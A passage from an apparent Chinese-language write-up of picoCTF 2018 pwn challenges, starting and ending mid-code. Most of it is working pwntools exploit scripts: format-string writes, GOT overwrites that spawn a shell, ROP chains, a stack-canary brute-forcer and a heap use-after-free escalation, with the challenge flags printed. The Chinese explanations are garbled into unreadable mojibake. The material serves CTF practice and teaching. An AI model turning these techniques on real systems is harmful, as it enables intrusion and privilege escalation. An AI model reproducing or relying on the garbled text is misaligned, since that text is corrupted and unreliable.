&quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); printf(&quot;%s&quot;, flag); return 0; } void read_flag() { if (!authenticated) { printf(&quot;Sorry, you are not *authenticated*!\\n&quot;); } else { printf(&quot;Access Granted.\\n&quot;); flag(); } } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); char buf[64]; // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); printf(&quot;Would you like to read the flag? (yes/no)\\n&quot;); fgets(buf, sizeof(buf), stdin); if (strstr(buf, &quot;no&quot;) != NULL) { printf(&quot;Okay, Exiting...\\n&quot;); exit(1); } else if (strstr(buf, &quot;yes&quot;) == NULL) { puts(&quot;Received Unknown Input:\\n&quot;); printf(buf); } read_flag(); } ç®€å•çš„è¿‡ä¸€éæˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¨‹åºçš„å¤§è‡´æµç¨‹ï¼Œå¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²å†…å¸¦æœ‰â€noâ€å°±é€€å‡ºç¨‹åºï¼Œå¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²å¸¦æœ‰â€yesâ€ä¸”æ²¡æœ‰â€noâ€ä¾¿è¿›å…¥unknown_inputåˆ†æ”¯å¹¶è§¦å‘äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç„¶åç¨‹åºç»§ç»­æ‰§è¡Œè¿›å…¥read_flag()å‡½æ•°é‡Œï¼Œå…ˆè¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœauthenticatedä¸ä¸º0å°±èƒ½è°ƒç”¨flagå‡½æ•°æ¥getflagï¼Œè€Œauthenticatedæ˜¯åœ¨ä¸€å¼€å§‹å°±å…¨å±€å®šä¹‰ä¸º0äº†ï¼Œè¿™æ—¶æˆ‘ä»¬èƒ½æƒ³åˆ°é€šè¿‡åˆ©ç”¨å‰é¢çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥ä¿®æ”¹authenticatedçš„å€¼ EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./auth&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,52398) elf = ELF(&#39;./auth&#39;) puts_got = elf.got[&#39;puts&#39;] puts_sym = elf.symbols[&#39;puts&#39;] authenticated_addr = 0x0804A04C payload = fmtstr_payload(11,{authenticated_addr:0xDEADBEEF}) n.sendline(payload) n.interactive() FLAG picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698} gotâ€”shell?âœ got-shell file auth auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c1f84b034b4906cce036c3748d4b5a5c3eae0d8, not stripped âœ got-shell checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/got-shell/auth&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) çœ‹ä¸€æ³¢æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; void win() { system(&quot;/bin/sh&quot;); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); char buf[256]; unsigned int address; unsigned int value; puts(&quot;I&#39;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;); scanf(&quot;%x&quot;, &amp;address); sprintf(buf, &quot;Okay, now what value would you like to write to 0x%x&quot;, address); puts(buf); scanf(&quot;%x&quot;, &amp;value); sprintf(buf, &quot;Okay, writing 0x%x to 0x%x&quot;, value, address); puts(buf); *(unsigned int *)address = value; puts(&quot;Okay, exiting now...\\n&quot;); exit(1); } å¼€å§‹è¿˜ä»¥ä¸ºè‡ªå·±æ˜¯ä¸æ˜¯Cæ²¡å­¦å¥½ï¼Œè¿™é¢˜æ€ä¹ˆå¯èƒ½è¿™ä¹ˆç®€å•è¾“å…¥ä¸¤ä¸ªåœ°å€å°±getshelläº†ï¼Œç»“æœå‘ç°è¿˜çœŸçš„æ˜¯ã€‚ç¨‹åºçš„é€»è¾‘å¤§è‡´ä¸ºè¾“å…¥ä¸€ä¸ªåå…­è¿›åˆ¶çš„åœ°å€ï¼Œç„¶åå†è¾“å…¥ä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°å€¼ï¼Œç„¶åæŠŠç¬¬ä¸€æ¬¡è¾“å…¥çš„åœ°å€çš„å€¼æ›¿æ¢æˆè¾“å…¥çš„æ•°å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°ç”¨winå‡½æ•°çš„åœ°å€å»æ›¿æ¢puts_gotï¼Œè¿™æ ·åœ¨ç¨‹åºè°ƒç”¨putsæ—¶å°±ç›¸å½“è°ƒç”¨äº†winå‡½æ•°æ¥getshell EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./auth&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,23731) elf = ELF(&#39;./auth&#39;) puts_got = elf.got[&#39;puts&#39;] win_addr = 0x0804854B n.sendline(hex(puts_got)) sleep(0.1) n.sendline(hex(win_addr)) n.interactive() FLAG picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81} rop chainâœ ropchain file rop rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=86b31b317beb6a0fac1439ef6b2a271e0132537e, not stripped âœ ropchain checksec rop [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/ropchain/rop&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) çœ‹ä¸€ä¸‹æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdbool.h&gt; #define BUFSIZE 16 bool win1 = false; bool win2 = false; void win_function1() { win1 = true; } void win_function2(unsigned int arg_check1) { if (win1 &amp;&amp; arg_check1 == 0xBAAAAAAD) { win2 = true; } else if (win1) { printf(&quot;Wrong Argument. Try Again.\\n&quot;); } else { printf(&quot;Nope. Try a little bit harder.\\n&quot;); } } void flag(unsigned int arg_check2) { char flag[48]; FILE *file; file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); if (win1 &amp;&amp; win2 &amp;&amp; arg_check2 == 0xDEADBAAD) { printf(&quot;%s&quot;, flag); return; } else if (win1 &amp;&amp; win2) { printf(&quot;Incorrect Argument. Remember, you can call other functions in between each win function!\\n&quot;); } else if (win1 || win2) { printf(&quot;Nice Try! You&#39;re Getting There!\\n&quot;); } else { printf(&quot;You won&#39;t get the flag that easy..\\n&quot;); } } void vuln() { char buf[16]; printf(&quot;Enter your input&gt; &quot;); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } å®¡è®¡è¿‡ä»£ç åæˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¨‹åºä¸­å„ä¸ªå‡½æ•°çš„åŠŸèƒ½å’Œä½œç”¨ï¼Œåƒwin_function1å‡½æ•°çš„ä½œç”¨ä¸ºå°†å…¨å±€å˜é‡win1çš„å€¼èµ‹ä¸º1ï¼Œwin_function2å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨win1é0ä¸”ä¼ å…¥çš„å‚æ•°ä¸º0xBAAAAAADæ—¶å°†å…¨å±€å˜é‡win2çš„å€¼èµ‹ä¸º1ï¼Œflagå‡½æ•°çš„ä½œç”¨æ˜¯å½“å…¨å±€å˜é‡win1ï¼Œwin2éƒ½ä¸ä¸º0ä¸”ä¼ å…¥çš„å‚æ•°ä¸º0xDEADBAADæ—¶è¾“å‡ºflagï¼Œè¿™æ ·æˆ‘ä»¬å°±çŸ¥é“è¦é€šè¿‡vulnå‡½æ•°é‡Œçš„æ ˆæº¢å‡ºæ¥æ„é€ ROPå»åˆ†åˆ«æ‰§è¡Œè¿™ä¸‰ä¸ªå‡½æ•°getflag EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./rop&#39;) elf = ELF(&#39;./rop&#39;) func1 = 0x080485CB func2 = 0x080485d8 flag = 0x0804862B pop_ret = 0x080485d6 buf = &#39;a&#39;*0x18 payload = buf + &#39;aaaa&#39; payload += p32(func1)+p32(pop_ret) + p32(0) payload += p32(func2)+p32(pop_ret) + p32(0xBAAAAAAD) payload += p32(flag)+p32(pop_ret) + p32(0xDEADBAAD) n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) n.interactive() FLAG picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52} buffer overflow 3âœ bufferoverflow3 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=49bf81f7f16a1c26cfbbb0a70bb89246fadc370e, not stripped âœ bufferoverflow3 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow3/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å—¯ï¼Œæ²¡å¼€canaryï¼Œçœ‹ä¸€æ³¢æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;wchar.h&gt; #include &lt;locale.h&gt; #define BUFSIZE 32 #define FLAGSIZE 64 #define CANARY_SIZE 4 void win() { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); puts(buf); fflush(stdout); } char global_canary[CANARY_SIZE]; void read_canary() { FILE *f = fopen(&quot;canary.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fread(global_canary,sizeof(char),CANARY_SIZE,f); fclose(f); } void vuln(){ char canary[CANARY_SIZE]; char buf[BUFSIZE]; char length[BUFSIZE]; int count; int x = 0; memcpy(canary,global_canary,CANARY_SIZE); printf(&quot;How Many Bytes will You Write Into the Buffer?\\n&gt; &quot;); while (x&lt;BUFSIZE) { read(0,length+x,1); if (length[x]==&#39;\\n&#39;) break; x++; } sscanf(length,&quot;%d&quot;,&amp;count); printf(&quot;Input&gt; &quot;); read(0,buf,count); if (memcmp(canary,global_canary,CANARY_SIZE)) { printf(&quot;*** Stack Smashing Detected *** : Canary Value Corrupt!\\n&quot;); exit(-1); } printf(&quot;Ok... Now Where&#39;s the Flag?\\n&quot;); fflush(stdout); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges int i; gid_t gid = getegid(); setresgid(gid, gid, gid); read_canary(); vuln(); return 0; } æ‰“å¼€å®¡è®¡åå‘ç°å®ƒè‡ªå·±å®ç°äº†ä¸€ä¸ªç®€æ˜“çš„Canaryé˜²æŠ¤å‡½æ•°ï¼Œæˆ‘ä»¬é’ˆå¯¹canaryå¸¸ç”¨çš„æ”»å‡»æ–¹å¼ä¸­Stack Smashing Protector Leak æ”»å‡»å¯ä»¥ç«‹é©¬å¦å†³ï¼Œå› ä¸ºé”™è¯¯å›æ˜¾å¹¶æ²¡æœ‰è¾“å‡ºavgr[0]è¿™ä¸ªå¿…è¦æ¡ä»¶ã€‚ç¨‹åºä¸­canaryçš„å€¼æ˜¯ä»ä¸€ä¸ªå†…å®¹ä¸å˜çš„æ–‡æœ¬æ–‡æ¡£ä¸­è¯»å–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å†™çˆ†ç ´è„šæœ¬å»æŠŠcanaryçš„å…·ä½“å†…å®¹è¾“å‡ºå‡ºæ¥ã€‚ é€šè¿‡idaæˆ‘ä»¬å¯ä»¥å¾—åˆ°canaryæ’å…¥åœ¨æ ˆä¸Š0x10çš„ä½ç½®ï¼Œè¾“å…¥çš„é¦–åœ°å€ä½äºæ ˆä¸Š0x30ï¼Œ char buf; // [esp+28h] [ebp-30h] int canary; // [esp+48h] [ebp-10h] æˆ‘ä»¬è¿è¡Œç¨‹åºæµ‹è¯•ä¸€ä¸‹ âœ bufferoverflow3 ./vuln How Many Bytes will You Write Into the Buffer? &gt; 32 Input&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Ok... Now Where&#39;s the Flag? âœ bufferoverflow3 ./vuln How Many Bytes will You Write Into the Buffer? &gt; 33 Input&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa *** Stack Smashing Detected *** : Canary Value Corrupt! ç¡®è®¤canaryæ’å…¥çš„ä½ç½®ä¸º0x20 bp.py from pwn import* #canary = &#39;h_?=&#39; canary = &#39;&#39; for i in range(4): for a in range(0xff): n = process(&#39;./vuln&#39;) n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;36&#39;) n.recvuntil(&#39;Input&gt; &#39;) payload = &#39;a&#39;*0x20+canary+chr(a) #print chr(a) n.send(payload) try: n.recvuntil(&#39;*** Stack Smashing Detected ***&#39;) except: if canary==&#39;&#39;: canary = chr(a) else: canary += chr(a) n.close() break else: n.close() print &#39;canary:&#39;,canary é€šè¿‡çˆ†ç ´æˆ‘ä»¬å¾—åˆ°canaryçš„å€¼ä¸ºâ€h_?=â€å®åœ¨æ˜¯é¬¼ç•œï¼Œæœ¬ä»¥ä¸ºæ˜¯PICOçš„æˆ‘è¿˜æ˜¯å¤ªå¤©çœŸäº† åœ¨çŸ¥é“canaryçš„æƒ…å†µä¸‹ï¼Œå‰©ä¸‹çš„å°±æ˜¯ç®€å•çš„æ ˆæº¢å‡ºåŠ«æŒç¨‹åºæ‰§è¡Œæµè‡³winå‡½æ•°å°±èƒ½get flagäº† EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) canary = &#39;h_?=&#39; win_addr = 0x080486EB payload = &#39;a&#39;*0x20+canary+&#39;a&#39;*(0x10-len(canary)+4)+p32(win_addr) n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;100&#39;) n.recvuntil(&#39;Input&gt; &#39;) n.sendline(payload) n.interactive() echo backâœ echo back file echoback echoback: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0980ead6e67788ea13395e9bdd23f0fe3d0b2c8, not stripped âœ echo back checksec echoback [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/echo back/echoback&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) å¼€äº†NXå’ŒCanaryï¼Œå®¡è®¡ä¸‹æºç â€¦â€¦ç„¶è€Œè¿™é¢˜å¹¶æ²¡æœ‰ç»™ï¼Œé‚£å°±å¼€idaçœ‹ä¸€ä¸‹ç¨‹åºå¹²äº†äº›ä»€ä¹ˆ int __cdecl main(int argc, const char **argv, const char **envp) { __gid_t v3; // ST1C_4 setvbuf(_bss_start, 0, 2, 0); v3 = getegid(); setresgid(v3, v3, v3); vuln(); return 0; } æˆ‘ä»¬åœ¨vulnå‡½æ•°é‡Œå‘ç°å­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç”±äºæˆ‘å¤ªèœäº†æ²¡èƒ½æƒ³å‡ºèƒ½åªç”¨ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å°±èƒ½getshellçš„payloadï¼Œæ‰€ä»¥å°±æƒ³å…ˆæŠŠputs_gotæ”¹æˆäº†vulnå‡½æ•°çš„åœ°å€ï¼Œè®©è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´èƒ½å¤šæ¬¡è§¦å‘ã€‚ æˆ‘ä»¬å®¡è®¡è¿‡ç¨‹åºåèƒ½å¾—åˆ°çš„å¤§è‡´æ€è·¯ä¸ºå…ˆæµ‹å‡ºåç§»ï¼Œä¿®æ”¹puts_gotä¸ºvulnå‡½æ•°åœ°å€ä½¿å¾—æ¼æ´èƒ½å¤šæ¬¡è§¦å‘ï¼Œç„¶åé€šè¿‡p32(system_got)+fmt_offsetæ¥å¾—åˆ°systemçš„çœŸå®åœ°å€ï¼Œå†æŠŠsystemçš„çœŸå®åœ°å€å†™å…¥printf_gotï¼Œç„¶ååœ¨ä¸‹ä¸€è½®å¾ªç¯ä¸­è¾“å…¥â€™/bin/shâ€™åprintf(â€˜/bin/shâ€™)å°±ç›¸å½“æ‰§è¡Œäº†system(â€˜/bin/shâ€™)æ¥getshell âœ echo back ./echoback input your message: aaaa%7$x aaaa61616161 Thanks for sending the message! EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./echoback&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,37402) elf = ELF(&#39;./echoback&#39;) printf_got = elf.got[&#39;printf&#39;] puts_got = elf.got[&#39;puts&#39;] system_got = elf.got[&#39;system&#39;] vuln_addr = 0x080485AB payload1 = fmtstr_payload(7,{puts_got:vuln_addr}) n.recvuntil(&#39;message:&#39;) n.sendline(payload1) leak_payload = p32(system_got)+&#39;%7$s&#39; n.send(leak_payload) n.recvuntil(&#39;message:&#39;) system_addr = u32(n.recv()[5:9]) print hex(system_addr) payload = fmtstr_payload(7,{printf_got:system_addr}) n.sendline(payload) n.interactive() are you root?âœ are_you_root file auth auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ebad5f08a8e9d227f3783cc951f2737547e086, not stripped âœ are_you_root checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/are_you_root/auth&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) æºç åˆ†æè¿‡ä¸€éå,æˆ‘ä»¬é”å®šäº†å‡ ä¸ªå­˜åœ¨æ¼æ´å¯èƒ½çš„åˆ†æ”¯ è¾“å…¥ç”¨çš„æ˜¯fgets if(fgets(buf, 512, stdin) == NULL) break; typedef enum auth_level { ANONYMOUS = 1, GUEST = 2, USER = 3, ADMIN = 4, ROOT = 5 } auth_level_t; struct user { char *name; auth_level_t level; }; loginåˆ†æ”¯ else if (!strncmp(buf, &quot;login&quot;, 5)) { if (user != NULL) { puts(&quot;Already logged in. Reset first.&quot;); continue; } arg = strtok(&amp;buf[6], &quot;\\n&quot;); if (arg == NULL) { puts(&quot;Invalid command&quot;); continue; } user = (struct user *)malloc(sizeof(struct user)); if (user == NULL) { puts(&quot;malloc() returned NULL. Out of Memory\\n&quot;); exit(-1); } user-&gt;name = strdup(arg); printf(&quot;Logged in as \\&quot;%s\\&quot;\\n&quot;, arg); } resetåˆ†æ”¯ else if(!strncmp(buf, &quot;reset&quot;, 5)) { if (user == NULL) { puts(&quot;Not logged in!&quot;); continue; } free(user-&gt;name); user = NULL; puts(&quot;Logged out!&quot;); } æˆ‘ä»¬å…ˆç™»é™†ä¸€ä¸ªname=â€™aâ€™* 0x10,level=3çš„è´¦å·ï¼Œä¸‹æ–­ç‚¹çœ‹ä¸€ä¸‹å †é‡Œé¢çš„åˆ†å¸ƒ gdb-peda$ parseheap addr prev size status fd bk 0x603000 0x0 0x410 Used None None 0x603410 0x0 0x20 Used None None 0x603430 0x0 0x20 Used None None gdb-peda$ x/8x 0x603410 0x603410: 0x0000000000000000 0x0000000000000021 0x603420: 0x0000000000603440 &lt;-*name 0x0000000000000003 &lt;-level 0x603430: 0x0000000000000000 0x0000000000000021 0x603440: 0x6161616161616161 &lt;-name 0x6161616161616161 &lt;-name gdb-peda$ 0x603450: 0x0000000000000000 0x0000000000020bb1 0x603460: 0x0000000000000000 0x0000000000000000 0x603470: 0x0000000000000000 0x0000000000000000 0x603480: 0x0000000000000000 0x0000000000000000 ç„¶åresetè¿™ä¸ªè´¦å·ï¼Œå†çœ‹ä¸‹å † gdb-peda$ x/8x 0x603410 0x603410: 0x0000000000000000 0x0000000000000021 0x603420: 0x0000000000603440 &lt;-*name 0x0000000000000003 0x603430: 0x0000000000000000 0x0000000000000021 0x603440: 0x0000000000000000 0x6161616161616161 &lt;- over_name gdb-peda$ 0x603450: 0x0000000000000000 0x0000000000020bb1 0x603460: 0x0000000000000000 0x0000000000000000 0x603470: 0x0000000000000000 0x0000000000000000 0x603480: 0x0000000000000000 0x0000000000000000 å‘ç°0x603440é‡Œçš„å€¼å·²ç»ç½®ä¸ºNULLäº†ï¼Œä½†0x603448éƒ¨åˆ†çš„å€¼å´æ²¡è¢«æ¸…0ï¼Œåˆå› ä¸ºæˆ‘ä»¬çš„nameå¯ä»¥è¾“å…¥å¾ˆé•¿ï¼Œå¹¶ä¸”åœ¨å»ºç«‹è´¦å·æ—¶å¹¶æ²¡æœ‰å¯¹levelç½®0æ“ä½œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å»æ„é€ ä¸€ä¸ªnameä½¿å…¶å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ä¸ªå †çš„levelä½å°±å¯ä»¥åšåˆ°ä¸‹ä¸€ä¸ªè´¦å·çš„levelä½å¯ä»¥ä»»æ„ä¿®æ”¹ æˆ‘ä»¬å†å»ºä¸€ä¸ªè´¦å·çœ‹çœ‹ä¸‹ä¸€ä¸ªè´¦å·çš„levelä½å’Œå‰ä¸€ä¸ªè´¦å·çš„nameçš„ç›¸å¯¹ä½ç½® gdb-peda$ x/8x 0x603410 0x603410: 0x0000000000000000 0x0000000000000021 0x603420: 0x0000000000603440 0x0000000000000000 0x603430: 0x0000000000000000 &lt;-name 0x0000000000000021 0x603440: 0x0000000000603460 0x0000000000000003 &lt;-level é€šè¿‡è®¡ç®—æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ°nameçš„èµ·å§‹ä½ç½®å’Œä¸‹ä¸€ä¸ªè´¦å·çš„levelä½è·ç¦»ä½8ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ„é€ â€™aâ€™* 0x8+p64(5)å°±èƒ½è®¾å¥½ä¸‹ä¸€ä¸ªè´¦å·çš„levelä½ EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,41208) #n = process(&#39;./auth&#39;) elf = ELF(&#39;./auth&#39;) def reset(): n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;reset&#39;) def login(name): n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;login &#39;+name) def getflag(): n.sendline(&#39;get-flag&#39;) payload = &#39;a&#39;*8+p64(5) login(payload) gdb.attach(n) reset() login(&#39;Ep3ius&#39;) getflag() n.interactive() FLAG picoCTF{m3sS1nG_w1tH_tH3_h43p_bc7d345a} can-you-gets-meâœ can-you-gets-me file gets gets: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped âœ can-you-gets-me checksec gets [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/can-you-gets-me/gets&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 16 void vuln() { char buf[16]; printf(&quot;GIVE ME YOUR NAME!\\n&quot;); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } çœ‹äº†ä¸€æ³¢æºç ï¼Œåªç»™äº†ä¸€ä¸ªgetså’Œprintfï¼Œä¸€å¼€å§‹æˆ‘è¿˜æƒ³è¯´æ˜¯ä¸æ˜¯ç”¨ret2dl-resolveï¼Œåæ¥è‚äº†ä¸€å¤©éƒ½æ²¡è‚å‡ºï¼ŒæŸ¥æŠ¥é”™çš„æ—¶å€™å‘ç°æ²¡åŠæ³•æ‰¾åˆ°pltè¡¨ï¼Œå°±åœ¨æƒ³è¿™ä¸ªä¼šä¸ä¼šæ˜¯é™æ€ç¼–è¯‘çš„æ–‡ä»¶ï¼Œå°±ç”¨lddæ£€æŸ¥äº†ä¸‹ âœ can-you-gets-me ldd gets ä¸æ˜¯åŠ¨æ€å¯æ‰§è¡Œæ–‡ä»¶ âœ can-you-gets-me emmmmï¼Œå±…ç„¶è¿˜çœŸæ˜¯é™æ€åº“ç¼–è¯‘çš„é‚£ä¹ˆæˆ‘ä»¬è¯•è¯•ç”¨ropgadgetçš„ropchainæ¥æ„é€ ROPé“¾ç„å­¦ä¸€é”®getshell ROPgadget --binary gets --ropchain - Step 5 -- Build the ROP chain #!/usr/bin/env python2 # execve generated by ROPgadget from struct import pack # Padding goes here p = &#39;&#39; p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;//sh&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080de955) # pop ecx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806cc25) # int 0x80 âœ can-you-gets-me ç»“æœç¡®å®åªè¦æº¢å‡ºåæ‰§è¡Œå°±èƒ½getshelläº† EXP from pwn import* from struct import pack n = process(&#39;./gets&#39;) # Padding goes here p = &#39;a&#39;*0x18 + &#39;aaaa&#39; # buf p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 p += pack(&#39;&lt;I&#39;, 0x080b81c6) # pop eax ; ret p += &#39;//sh&#39; p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret 